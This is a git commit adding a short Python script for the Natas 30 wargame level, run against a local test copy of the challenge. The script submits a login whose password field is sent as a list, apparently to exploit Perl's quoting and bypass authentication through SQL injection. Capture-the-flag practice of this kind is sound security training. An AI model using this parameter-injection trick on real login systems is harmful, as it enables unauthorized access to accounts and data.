7e30998ec093bd324ca44c7296b8c0035cbf8190
Ludisposed <pjgvanschaik@gmail.com>
2017-12-20 14:15:08 +0100

    Create local_natas.py

---
+++ Natas/Natas30env/local_natas.py
@@ -0,0 +1,17 @@
+import requests
+from urllib.parse import quote, unquote
+
+session = requests.Session()
+
+def natas30(url):    
+    params={"username": "natas31", "password": ["password", 1]}
+    response = session.post(url, data=params)
+    print(response.text)
+    if 'FAIL' in response.text:
+        print("FAILED")
+    else:
+        print("SUCCES")
+
+if __name__ == '__main__':
+    url = 'http://localhost:8080/index.pl'
+    natas30(url)
